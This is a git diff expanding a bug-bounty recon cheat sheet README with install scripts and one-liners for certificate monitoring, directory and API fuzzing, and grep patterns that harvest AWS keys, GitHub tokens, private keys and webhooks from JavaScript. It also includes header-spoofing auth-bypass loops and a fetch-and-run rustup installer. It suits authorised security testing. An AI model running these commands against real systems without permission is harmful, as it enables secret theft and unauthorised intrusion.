@@ -234,7 +234,7 @@ subfinder -d target.com -silent | httpx -silent | nuclei -severity critical,high
 | Category | Tools | Installation |
 |:--------:|:------|:-------------|
 | **Subdomain** | [Subfinder](https://github.com/projectdiscovery/subfinder), [Amass](https://github.com/OWASP/Amass), [Assetfinder](https://github.com/tomnomnom/assetfinder), [Findomain](https://github.com/Edu4rdSHL/findomain), [Chaos](https://github.com/projectdiscovery/chaos-client) | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
-| **HTTP** | [Httpx](https://github.com/projectdiscovery/httpx), [Httprobe](https://github.com/tomnomnom/httprobe) | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
+| **HTTP Probing** | [Httpx](https://github.com/projectdiscovery/httpx), [Httprobe](https://github.com/tomnomnom/httprobe) | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
 | **Crawling** | [Katana](https://github.com/projectdiscovery/katana), [Gospider](https://github.com/jaeles-project/gospider), [Hakrawler](https://github.com/hakluke/hakrawler), [Cariddi](https://github.com/edoardottt/cariddi) | `go install github.com/projectdiscovery/katana/cmd/katana@latest` |
 | **URLs** | [Gau](https://github.com/lc/gau), [Waybackurls](https://github.com/tomnomnom/waybackurls), [Waymore](https://github.com/xnl-h4ck3r/waymore) | `go install github.com/lc/gau/v2/cmd/gau@latest` |
 | **Scanning** | [Nuclei](https://github.com/projectdiscovery/nuclei), [Jaeles](https://github.com/jaeles-project/jaeles), [Naabu](https://github.com/projectdiscovery/naabu) | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
@@ -243,35 +243,302 @@ subfinder -d target.com -silent | httpx -silent | nuclei -severity critical,high
 | **Utilities** | [Anew](https://github.com/tomnomnom/anew), [Qsreplace](https://github.com/tomnomnom/qsreplace), [Unfurl](https://github.com/tomnomnom/unfurl), [Gf](https://github.com/tomnomnom/gf), [Uro](https://github.com/s0md3v/uro) | `go install github.com/tomnomnom/anew@latest` |
 | **Fuzzing** | [Ffuf](https://github.com/ffuf/ffuf), [Feroxbuster](https://github.com/epi052/feroxbuster) | `go install github.com/ffuf/ffuf/v2@latest` |
 | **JS Analysis** | [Subjs](https://github.com/lc/subjs), [LinkFinder](https://github.com/GerbenJavado/LinkFinder), [SecretFinder](https://github.com/m4ll0k/SecretFinder), [Jsubfinder](https://github.com/ThreatUnkown/jsubfinder) | `go install github.com/lc/subjs@latest` |
+| **Cert Monitoring** | [Certstream](https://github.com/CaliDog/certstream-python), [Certstream-go](https://github.com/CaliDog/certstream-go) | `pip install certstream` |
+| **DNS** | [Dnsx](https://github.com/projectdiscovery/dnsx), [Shuffledns](https://github.com/projectdiscovery/shuffledns), [PureDNS](https://github.com/d3mondev/puredns), [MassDNS](https://github.com/blechschmidt/massdns), [Dnsgen](https://github.com/ProjectAnte/dnsgen) | `go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest` |
+| **Reverse DNS** | [Hakrevdns](https://github.com/hakluke/hakrevdns), [Prips](https://gitlab.com/prips/prips) | `go install github.com/hakluke/hakrevdns@latest` |
+| **API Discovery** | [Arjun](https://github.com/s0md3v/Arjun), [x8](https://github.com/Sh1Yo/x8), [ParamSpider](https://github.com/devanshbatham/ParamSpider) | `pip install arjun` |
+| **Screenshots** | [Gowitness](https://github.com/sensepost/gowitness), [Eyewitness](https://github.com/FortyNorthSecurity/EyeWitness) | `go install github.com/sensepost/gowitness@latest` |
+| **Cloud** | [AWS CLI](https://aws.amazon.com/cli/), [CloudEnum](https://github.com/initstring/cloud_enum), [S3Scanner](https://github.com/sa7mon/S3Scanner) | `pip install awscli` |
+| **OSINT** | [Shodan CLI](https://cli.shodan.io/), [Censys](https://github.com/censys/censys-python), [Metabigor](https://github.com/j3ssie/metabigor) | `pip install shodan censys` |
+| **Git Recon** | [Trufflehog](https://github.com/trufflesecurity/trufflehog), [Gitrob](https://github.com/michenriksen/gitrob), [Github-Subdomains](https://github.com/gwen001/github-subdomains) | `go install github.com/trufflesecurity/trufflehog/v3@latest` |
+| **Scope Management** | [BBRF](https://github.com/honoki/bbrf-client) | `pip install bbrf` |
 
-### Quick Install Script
+### System Dependencies
+
+```bash
+# Ubuntu/Debian
+sudo apt update && sudo apt install -y \
+    jq \
+    curl \
+    wget \
+    git \
+    python3 \
+    python3-pip \
+    golang-go \
+    nmap \
+    masscan \
+    chromium-browser \
+    parallel \
+    whois \
+    dnsutils \
+    libpcap-dev \
+    build-essential
+
+# macOS
+brew install jq curl wget git python3 go nmap masscan chromium parallel whois bind
+```
+
+### Go Environment Setup
+
+```bash
+# Add to ~/.bashrc or ~/.zshrc
+export GOPATH=$HOME/go
+export GOROOT=/usr/local/go
+export PATH=$PATH:$GOPATH/bin:$GOROOT/bin
+
+# Reload shell
+source ~/.bashrc  # or source ~/.zshrc
+```
+
+### Quick Install Script - Go Tools
 
 ```bash
 #!/bin/bash
 # One-click install for all Go tools
-tools=(
+
+echo "[*] Installing Go tools..."
+go_tools=(
+    # ProjectDiscovery
     "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
     "github.com/projectdiscovery/httpx/cmd/httpx@latest"
     "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
     "github.com/projectdiscovery/katana/cmd/katana@latest"
     "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
-    "github.com/lc/gau/v2/cmd/gau@latest"
+    "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
+    "github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"
+    "github.com/projectdiscovery/chaos-client/cmd/chaos@latest"
+    # Tomnomnom
     "github.com/tomnomnom/waybackurls@latest"
     "github.com/tomnomnom/anew@latest"
     "github.com/tomnomnom/qsreplace@latest"
     "github.com/tomnomnom/unfurl@latest"
     "github.com/tomnomnom/gf@latest"
-    "github.com/hahwul/dalfox/v2@latest"
+    "github.com/tomnomnom/assetfinder@latest"
+    "github.com/tomnomnom/httprobe@latest"
+    # Fuzzing & Crawling
     "github.com/ffuf/ffuf/v2@latest"
     "github.com/jaeles-project/gospider@latest"
     "github.com/hakluke/hakrawler@latest"
+    "github.com/hakluke/hakrevdns@latest"
+    # Security
+    "github.com/hahwul/dalfox/v2@latest"
+    "github.com/lc/gau/v2/cmd/gau@latest"
+    "github.com/lc/subjs@latest"
+    # Screenshots & Utils
+    "github.com/sensepost/gowitness@latest"
+    "github.com/d3mondev/puredns/v2@latest"
+    "github.com/j3ssie/metabigor@latest"
+    "github.com/Emoe/kxss@latest"
+    "github.com/ferreiraklet/airixss@latest"
+    "github.com/edoardottt/cariddi/cmd/cariddi@latest"
+    "github.com/trufflesecurity/trufflehog/v3@latest"
 )
 
-for tool in "${tools[@]}"; do
+for tool in "${go_tools[@]}"; do
     echo "[+] Installing $tool"
-    go install -v "$tool"
+    go install -v "$tool" 2>/dev/null
 done
-echo "[✓] All tools installed!"
+
+echo "[✓] Go tools installed!"
+```
+
+### Quick Install Script - Python Tools
+
+```bash
+#!/bin/bash
+# One-click install for all Python tools
+
+echo "[*] Installing Python tools..."
+
+pip3 install --upgrade pip
+
+pip3 install \
+    certstream \
+    sqlmap \
+    ghauri \
+    uro \
+    arjun \
+    paramspider \
+    shodan \
+    censys \
+    bbrf \
+    dnsgen \
+    waymore \
+    xsstrike \
+    s3scanner \
+    cloud_enum \
+    trufflehog
+
+echo "[✓] Python tools installed!"
+```
+
+### Quick Install Script - Rust Tools (Feroxbuster)
+
+```bash
+#!/bin/bash
+# Install Feroxbuster (Rust)
+
+echo "[*] Installing Rust tools..."
+
+# Install Rust if not present
+if ! command -v cargo &> /dev/null; then
+    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
+    source $HOME/.cargo/env
+fi
+
+# Install Feroxbuster
+cargo install feroxbuster
+
+echo "[✓] Rust tools installed!"
+```
+
+### Quick Install Script - External Tools
+
+```bash
+#!/bin/bash
+# Install tools that require cloning
+
+echo "[*] Installing external tools..."
+
+TOOLS_DIR="$HOME/tools"
+mkdir -p $TOOLS_DIR && cd $TOOLS_DIR
+
+# LinkFinder
+git clone https://github.com/GerbenJavado/LinkFinder.git
+cd LinkFinder && pip3 install -r requirements.txt && cd ..
+
+# SecretFinder
+git clone https://github.com/m4ll0k/SecretFinder.git
+cd SecretFinder && pip3 install -r requirements.txt && cd ..
+
+# Findomain
+wget https://github.com/Findomain/Findomain/releases/latest/download/findomain-linux.zip
+unzip findomain-linux.zip && chmod +x findomain && sudo mv findomain /usr/local/bin/
+
+# MassDNS
+git clone https://github.com/blechschmidt/massdns.git
+cd massdns && make && sudo mv bin/massdns /usr/local/bin/ && cd ..
+
+# Amass
+go install -v github.com/owasp-amass/amass/v4/...@master
+
+# GF Patterns
+git clone https://github.com/1ndianl33t/Gf-Patterns.git
+mkdir -p ~/.gf && cp Gf-Patterns/*.json ~/.gf/
+
+echo "[✓] External tools installed!"
+```
+
+### Master Install Script (All-in-One)
+
+```bash
+#!/bin/bash
+# MASTER INSTALLER - Run all installation scripts
+
+echo "╔══════════════════════════════════════════════════════════╗"
+echo "║     KingOfBugBounty - Complete Tool Installation         ║"
+echo "╚══════════════════════════════════════════════════════════╝"
+
+# System dependencies (run with sudo)
+echo "[1/5] Installing system dependencies..."
+sudo apt update && sudo apt install -y jq curl wget git python3 python3-pip golang-go nmap masscan chromium-browser parallel whois dnsutils libpcap-dev build-essential
+
+# Go environment
+echo "[2/5] Setting up Go environment..."
+echo 'export GOPATH=$HOME/go' >> ~/.bashrc
+echo 'export PATH=$PATH:$GOPATH/bin' >> ~/.bashrc
+source ~/.bashrc
+
+# Go tools
+echo "[3/5] Installing Go tools..."
+go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+go install -v github.com/projectdiscovery/katana/cmd/katana@latest
+go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
+go install -v github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest
+go install -v github.com/tomnomnom/waybackurls@latest
+go install -v github.com/tomnomnom/anew@latest
+go install -v github.com/tomnomnom/qsreplace@latest
+go install -v github.com/tomnomnom/unfurl@latest
+go install -v github.com/tomnomnom/gf@latest
+go install -v github.com/tomnomnom/assetfinder@latest
+go install -v github.com/ffuf/ffuf/v2@latest
+go install -v github.com/hahwul/dalfox/v2@latest
+go install -v github.com/lc/gau/v2/cmd/gau@latest
+go install -v github.com/jaeles-project/gospider@latest
+go install -v github.com/hakluke/hakrawler@latest
+go install -v github.com/hakluke/hakrevdns@latest
+go install -v github.com/sensepost/gowitness@latest
+go install -v github.com/d3mondev/puredns/v2@latest
+go install -v github.com/owasp-amass/amass/v4/...@master
+
+# Python tools
+echo "[4/5] Installing Python tools..."
+pip3 install certstream sqlmap ghauri uro arjun shodan censys bbrf dnsgen waymore
+
+# Rust tools
+echo "[5/5] Installing Rust tools..."
+if ! command -v cargo &> /dev/null; then
+    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
+    source $HOME/.cargo/env
+fi
+cargo install feroxbuster
+
+# Update Nuclei templates
+nuclei -update-templates
+
+echo ""
+echo "╔══════════════════════════════════════════════════════════╗"
+echo "║            ✓ Installation Complete!                      ║"
+echo "╚══════════════════════════════════════════════════════════╝"
+echo ""
+echo "Run 'source ~/.bashrc' to reload your environment"
+```
+
+### Wordlists Installation
+
+```bash
+#!/bin/bash
+# Install essential wordlists
+
+WORDLIST_DIR="$HOME/wordlists"
+mkdir -p $WORDLIST_DIR && cd $WORDLIST_DIR
+
+# SecLists
+git clone https://github.com/danielmiessler/SecLists.git
+
+# Assetnote Wordlists
+wget -r --no-parent -R "index.html*" https://wordlists-cdn.assetnote.io/data/ -nH
+
+# OneListForAll
+git clone https://github.com/six2dez/OneListForAll.git
+
+# Resolvers
+wget https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -O resolvers.txt
+wget https://raw.githubusercontent.com/trickest/resolvers/main/resolvers-trusted.txt -O resolvers-trusted.txt
+
+echo "[✓] Wordlists installed in $WORDLIST_DIR"
+```
+
+### Verify Installation
+
+```bash
+#!/bin/bash
+# Verify all tools are installed
+
+echo "Checking installed tools..."
+
+tools=("subfinder" "httpx" "nuclei" "katana" "naabu" "dnsx" "ffuf" "feroxbuster" "dalfox" "gau" "waybackurls" "anew" "qsreplace" "gf" "gospider" "hakrawler" "amass" "gowitness" "certstream" "sqlmap" "arjun" "shodan")
+
+for tool in "${tools[@]}"; do
+    if command -v $tool &> /dev/null; then
+        echo "[✓] $tool"
+    else
+        echo "[✗] $tool - NOT FOUND"
+    fi
+done
 ```
 
 </details>
@@ -319,6 +586,72 @@ cat subs.txt | httpx -silent -threads 200 | anew alive.txt
 ```bash
 # ☠️ crt.sh extraction
 curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httpx -silent
+```
+
+### 💀 Certstream Real-Time Monitoring - Basic
+```bash
+# ☠️ Monitor certificates in real-time for specific keyword
+pip install certstream && python3 -c "import certstream; certstream.listen_for_events(lambda msg, ctx: print(msg['data']['leaf_cert']['subject']['CN']) if 'target' in str(msg.get('data',{}).get('leaf_cert',{}).get('subject',{}).get('CN','')) else None, url='wss://certstream.calidog.io/')"
+```
+
+### 💀 Certstream with Domain Filter
+```bash
+# ☠️ Real-time cert monitoring filtered by domain keywords
+certstream --full | jq -r 'select(.data.leaf_cert.subject.CN != null) | .data.leaf_cert.subject.CN' | grep -iE "(target|company|brand)" | anew certstream_targets.txt
+```
+
+### 💀 Certstream to Subdomain Discovery
+```bash
+# ☠️ Extract all SANs (Subject Alternative Names) in real-time
+certstream --full | jq -r '.data.leaf_cert.extensions.subjectAltName // empty' | tr ',' '\n' | sed 's/DNS://g' | grep -E "target\.com$" | sort -u | anew certstream_subs.txt
+```
+
+### 💀 Certstream + httpx Live Pipeline
+```bash
+# ☠️ Real-time cert discovery -> immediate alive check
+certstream --full | jq -r '.data.leaf_cert.all_domains[]? // empty' 2>/dev/null | grep -iE "target" | sort -u | while read domain; do echo "$domain" | httpx -silent -timeout 3 | anew live_certs.txt; done
+```
+
+### 💀 Certstream Phishing Detection
+```bash
+# ☠️ Monitor for potential phishing domains (brand impersonation)
+certstream --full | jq -r '.data.leaf_cert.subject.CN // empty' | grep -iE "(paypal|apple|google|microsoft|amazon|facebook|netflix|bank)" | grep -vE "\.(paypal|apple|google|microsoft|amazon|facebook|netflix)\.com$" | anew phishing_certs.txt
+```
+
+### 💀 Certstream with Nuclei Auto-Scan
+```bash
+# ☠️ Real-time cert discovery -> automatic vulnerability scan
+certstream --full | jq -r '.data.leaf_cert.all_domains[]? // empty' | grep -E "\.target\.com$" | sort -u | while read domain; do echo "https://$domain" | nuclei -t /nuclei-templates/technologies/ -silent; done
+```
+
+### 💀 Certstream Mass Collector Script
+```bash
+# ☠️ Collect all certificates for specific TLDs
+timeout 3600 bash -c 'certstream --full | jq -r ".data.leaf_cert.all_domains[]? // empty" | grep -E "\.(gov|mil|edu)$" | anew gov_mil_edu_certs.txt' &
+```
+
+### 💀 Certstream Wildcard Certificate Hunter
+```bash
+# ☠️ Find wildcard certificates (*.domain.com) in real-time
+certstream --full | jq -r '.data.leaf_cert.subject.CN // empty' | grep "^\*\." | sed 's/^\*\.//' | sort -u | anew wildcard_domains.txt
+```
+
+### 💀 Certstream + Shodan Enrichment
+```bash
+# ☠️ Real-time certs -> resolve IP -> Shodan lookup
+certstream --full | jq -r '.data.leaf_cert.subject.CN // empty' | grep -iE "target" | while read domain; do IP=$(dig +short "$domain" | head -1); [ -n "$IP" ] && echo "$domain,$IP,$(shodan host $IP 2>/dev/null | head -3 | tr '\n' ' ')"; done | anew cert_shodan.txt
+```
+
+### 💀 Certstream JSON Logger with Timestamp
+```bash
+# ☠️ Full certificate logging with timestamps for analysis
+certstream --full | jq -c '{timestamp: now | strftime("%Y-%m-%d %H:%M:%S"), cn: .data.leaf_cert.subject.CN, domains: .data.leaf_cert.all_domains, issuer: .data.leaf_cert.issuer.O}' | grep -i "target" | tee -a certstream_log.json
+```
+
+### 💀 Certstream Bug Bounty Scope Monitor
+```bash
+# ☠️ Monitor multiple bug bounty targets simultaneously
+TARGETS="hackerone|bugcrowd|intigriti|yeswehack"; certstream --full | jq -r '.data.leaf_cert.all_domains[]? // empty' | grep -iE "$TARGETS" | anew bb_new_assets.txt &
 ```
 
 ### 💀 Shodan + Nuclei Pipeline
@@ -506,34 +839,59 @@ cat js.txt | xargs -I@ curl -s @ | grep -oE "(/api/[^\"\'\`\s\<\>]+|/v[0-9]+/[^\
 cat js.txt | xargs -I@ curl -s @ | grep -iE "(password|passwd|pwd|secret|api_key|apikey|token|auth)" | sort -u
 ```
 
-### 💀 Extract AWS Keys from JS Files
+### Extract AWS Keys from JS
 ```bash
-cat js.txt | xargs -I@ curl -s @ | grep -oE "(AKIA[0-9A-Z]{16}|ABIA[0-9A-Z]{16}|ACCA[0-9A-Z]{16})" | sort -u | anew aws_keys.txt
+cat js.txt | xargs -I@ curl -s @ | grep -oE "(AKIA[0-9A-Z]{16}|ABIA[0-9A-Z]{16}|ACCA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})" | sort -u | anew aws_keys.txt
 ```
 
-### 💀 Find S3 Buckets in JavaScript
+### Extract Google API Keys from JS
 ```bash
-cat js.txt | xargs -I@ curl -s @ | grep -oE "[a-zA-Z0-9.-]+\.s3\.amazonaws\.com|s3://[a-zA-Z0-9.-]+" | sort -u | anew s3_from_js.txt
+cat js.txt | xargs -I@ curl -s @ | grep -oE "AIza[0-9A-Za-z\-_]{35}" | sort -u | anew google_api_keys.txt
 ```
 
-### 💀 Extract Google API Keys
+### Extract Firebase URLs from JS
 ```bash
-cat js.txt | xargs -I@ curl -s @ | grep -oE "AIza[0-9A-Za-z\\-_]{35}" | sort -u | anew google_api_keys.txt
+cat js.txt | xargs -I@ curl -s @ | grep -oE "https://[a-zA-Z0-9-]+\.firebaseio\.com|https://[a-zA-Z0-9-]+\.firebase\.com" | sort -u | anew firebase_urls.txt
 ```
 
-### 💀 Find Firebase URLs in JS
+### Extract S3 Buckets from JS
 ```bash
-cat js.txt | xargs -I@ curl -s @ | grep -oE "https://[a-zA-Z0-9-]+\.firebaseio\.com|https://[a-zA-Z0-9-]+\.firebaseapp\.com" | sort -u | anew firebase_urls.txt
+cat js.txt | xargs -I@ curl -s @ | grep -oE "[a-zA-Z0-9.-]+\.s3\.amazonaws\.com|s3://[a-zA-Z0-9.-]+|s3-[a-zA-Z0-9-]+\.amazonaws\.com/[a-zA-Z0-9.-]+" | sort -u | anew s3_from_js.txt
+```
+
+### Extract Internal IPs from JS
+```bash
+cat js.txt | xargs -I@ curl -s @ | grep -oE "(10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]{1,3}\.[0-9]{1,3}|192\.168\.[0-9]{1,3}\.[0-9]{1,3})" | sort -u | anew internal_ips.txt
+```
+
+### Extract Slack Webhooks from JS
+```bash
+cat js.txt | xargs -I@ curl -s @ | grep -oE "https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+" | sort -u | anew slack_webhooks.txt
+```
+
+### Extract GitHub Tokens from JS
+```bash
+cat js.txt | xargs -I@ curl -s @ | grep -oE "(ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|ghu_[a-zA-Z0-9]{36}|ghs_[a-zA-Z0-9]{36}|ghr_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59})" | sort -u | anew github_tokens.txt
+```
+
+### Extract Private Keys from JS
+```bash
+cat js.txt | xargs -I@ curl -s @ | grep -oE "-----BEGIN (RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY( BLOCK)?-----" | sort -u | anew private_keys_found.txt
+```
+
+### Extract Email Addresses from JS
+```bash
+cat js.txt | xargs -I@ curl -s @ | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | sort -u | anew emails_from_js.txt
+```
+
+### Extract Hidden Subdomains from JS
+```bash
+cat js.txt | xargs -I@ curl -s @ | grep -oE "https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | sed 's|https\?://||' | cut -d'/' -f1 | sort -u | anew subdomains_from_js.txt
 ```
 
 ### 💀 Extract GraphQL Endpoints from JS
 ```bash
 cat js.txt | xargs -I@ curl -s @ | grep -oE "(graphql|gql|query|mutation)[^\"']*" | grep -oE "/[a-zA-Z0-9/_-]*graphql[a-zA-Z0-9/_-]*" | sort -u | anew graphql_endpoints.txt
-```
-
-### 💀 Find Internal IPs & Hostnames in JS
-```bash
-cat js.txt | xargs -I@ curl -s @ | grep -oE "https?://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[^\"' ]*|https?://[a-zA-Z0-9-]+\.(internal|local|corp|lan|intra)[^\"' ]*" | sort -u | anew internal_hosts.txt
 ```
 
 ### 💀 Extract JWT Tokens from JS Files
@@ -546,9 +904,9 @@ cat js.txt | xargs -I@ curl -s @ | grep -oE "eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]
 cat js.txt | sed 's/\.js$/.js.map/' | httpx -silent -mc 200 -ct -match-string "sourcesContent" | anew sourcemaps.txt
 ```
 
-### 💀 Extract Slack/Discord Webhooks from JS
+### 💀 Extract Discord Webhooks from JS
 ```bash
-cat js.txt | xargs -I@ curl -s @ | grep -oE "https://hooks\.slack\.com/services/[A-Za-z0-9/]+|https://discord\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+" | sort -u | anew webhooks.txt
+cat js.txt | xargs -I@ curl -s @ | grep -oE "https://discord\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+" | sort -u | anew discord_webhooks.txt
 ```
 
 ### 💀 Find Hidden Admin Routes in JS
@@ -756,6 +1114,66 @@ cat urls.txt | qsreplace 'param=value1&param=value2' | httpx -silent -mc 200
 ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403 -ac -c -t 100
 ```
 
+### 💀 Recursive Fuzzing - ffuf Deep Scan
+```bash
+# ☠️ Recursive directory bruteforce with depth 3
+ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3 -mc 200,301,302,403 -ac -c -t 100 -o ffuf_recursive.json -of json
+```
+
+### 💀 Feroxbuster Full Recursive Scan
+```bash
+# ☠️ Deep recursive scan with auto-tune and smart filtering
+feroxbuster -u https://target.com -w wordlist.txt -d 5 -L 4 --auto-tune -C 404,500 --smart -o ferox_results.txt
+```
+
+### 💀 Feroxbuster Multi-Target Recursive
+```bash
+# ☠️ Scan multiple targets from file with recursion
+cat alive.txt | xargs -I@ feroxbuster -u @ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 3 -t 50 --no-state -q -o ferox_@.txt
+```
+
+### 💀 ffuf + Feroxbuster Pipeline (Extensions + Recursion)
+```bash
+# ☠️ Find directories with ffuf, then deep scan each with feroxbuster
+ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302 -ac -c -t 100 -o dirs.json -of json && cat dirs.json | jq -r '.results[].url' | xargs -I@ feroxbuster -u @ -w wordlist.txt -x php,asp,aspx,jsp,html,js -d 2 -t 30 -q
+```
+
+### 💀 Recursive Fuzzing with Extensions Mass Scan
+```bash
+# ☠️ ffuf recursive with multiple extensions + backup files
+ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2 -e .php,.asp,.aspx,.jsp,.html,.js,.json,.xml,.bak,.old,.txt,.conf,.config,.zip,.tar.gz -mc 200,301,302,403,500 -ac -t 80 -rate 100 -o recursive_ext.json
+```
+
+### 💀 Feroxbuster Parallel Recursive Scan
+```bash
+# ☠️ Parallel scan with multiple wordlists and extensions
+feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,asp,aspx,jsp,bak,old,zip -d 4 -t 100 -L 5 --parallel 10 --dont-extract-links -C 404 -o ferox_parallel.txt
+```
+
+### 💀 Feroxbuster Silent Recursive + Headers
+```bash
+# ☠️ Stealth recursive scan with custom headers and rate limiting
+feroxbuster -u https://target.com -w wordlist.txt -d 3 -t 30 -r -k --random-agent -H "X-Forwarded-For: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1" --rate-limit 50 -C 400,401,403,404,500 -q -o ferox_stealth.txt
+```
+
+### 💀 Feroxbuster Extract Links + Recursive
+```bash
+# ☠️ Extract links from responses and add to scan queue recursively
+feroxbuster -u https://target.com -w wordlist.txt -d 5 --extract-links --collect-words --collect-backups -x php,html,js,json -t 50 -o ferox_extracted.txt
+```
+
+### 💀 Feroxbuster Resume + Filter by Size
+```bash
+# ☠️ Smart filtering by response size and resumable state
+feroxbuster -u https://target.com -w wordlist.txt -d 4 -S 0 -W 1 --filter-status 404,500 --filter-words 20 --filter-lines 5 --resume-from ferox_state.json --state-file ferox_state.json -o ferox_filtered.txt
+```
+
+### 💀 Feroxbuster API Endpoints Discovery
+```bash
+# ☠️ Recursive API fuzzing with JSON content-type
+feroxbuster -u https://target.com/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -d 3 -x json -t 50 -H "Accept: application/json" -H "Content-Type: application/json" --dont-extract-links -m GET,POST -o ferox_api.txt
+```
+
 ### Git Exposure
 ```bash
 cat urls.txt | httpx -silent -path /.git/config -mc 200 -ms "[core]" | anew git_exposed.txt
@@ -873,6 +1291,66 @@ for i in {1..100}; do curl -s -o /dev/null -w "%{http_code}\n" "https://target.c
 ### BOLA/IDOR Testing
 ```bash
 cat urls.txt | grep -oE "(id|user_id|account_id|uid)=[0-9]+" | sed 's/=[0-9]*/=FUZZ/' | sort -u | anew bola_candidates.txt
+```
+
+### 💀 API Endpoint Fuzzing with ffuf
+```bash
+# ☠️ Fuzz API endpoints with common paths and methods
+ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,204,301,302,401,403,405 -ac -c -t 100 -H "Content-Type: application/json" -o api_fuzz.json -of json
+```
+
+### 💀 API Version Fuzzing
+```bash
+# ☠️ Discover hidden API versions
+ffuf -u https://target.com/api/vFUZZ/users -w <(seq 1 20) -mc 200,201,401,403 -ac -c && ffuf -u https://target.com/FUZZ/users -w <(echo -e "api\nv1\nv2\nv3\nv4\napi/v1\napi/v2\napi/v3\napi/internal\napi/private\napi/admin\napi/dev\napi/test\napi/staging\napi/beta") -mc 200,201,401,403 -ac -c
+```
+
+### 💀 REST API Methods Fuzzing
+```bash
+# ☠️ Test all HTTP methods on API endpoints
+cat api_endpoints.txt | while read url; do for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE CONNECT; do CODE=$(curl -s -o /dev/null -w "%{http_code}" -X $method "$url" -H "Content-Type: application/json"); echo "$method $url - $CODE"; done; done | grep -vE " - (404|405)$" | anew api_methods.txt
+```
+
+### 💀 GraphQL Fuzzing with ffuf
+```bash
+# ☠️ Fuzz GraphQL endpoints for introspection and queries
+ffuf -u https://target.com/FUZZ -w <(echo -e "graphql\ngraphiql\nplayground\nconsole\nquery\ngql\nv1/graphql\nv2/graphql\napi/graphql\napi/gql") -mc 200,400 -ac -c -H "Content-Type: application/json" -d '{"query":"{__typename}"}' -X POST -o graphql_endpoints.json
+```
+
+### 💀 API Parameter Fuzzing
+```bash
+# ☠️ Discover hidden API parameters with arjun + ffuf combo
+cat api_endpoints.txt | xargs -I@ -P5 arjun -u @ -m POST -oT arjun_params.txt && cat api_endpoints.txt | xargs -I@ ffuf -u @?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,201,400,500 -ac -c -t 50 -o param_fuzz.json
+```
+
+### 💀 API Authentication Bypass Fuzzing
+```bash
+# ☠️ Test auth bypass techniques on protected endpoints
+cat api_endpoints.txt | while read url; do curl -s -o /dev/null -w "%{http_code} - $url\n" "$url" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1"; done | grep "^200" | anew auth_bypass.txt
+```
+
+### 💀 OpenAPI/Swagger Fuzzing
+```bash
+# ☠️ Find and extract endpoints from OpenAPI specs
+ffuf -u https://target.com/FUZZ -w <(echo -e "swagger.json\nswagger.yaml\nopenapi.json\nopenapi.yaml\napi-docs\napi-docs.json\nswagger-ui.html\nswagger/v1/swagger.json\nv1/swagger.json\nv2/swagger.json\nv3/swagger.json\napi/swagger.json\ndocs/api\napi/docs") -mc 200 -ac -c | tee swagger_found.txt | xargs -I@ curl -s @ | jq -r '.paths | keys[]' 2>/dev/null | anew swagger_paths.txt
+```
+
+### 💀 API JSON Fuzzing with Nuclei
+```bash
+# ☠️ Mass API fuzzing with nuclei DAST mode
+cat api_endpoints.txt | httpx -silent -mc 200,201,401,403 | nuclei -dast -t dast/vulnerabilities/ -H "Content-Type: application/json" -rl 20 -c 5 -o api_nuclei_dast.txt
+```
+
+### 💀 API Mass Assignment Fuzzing
+```bash
+# ☠️ Test for mass assignment vulnerabilities
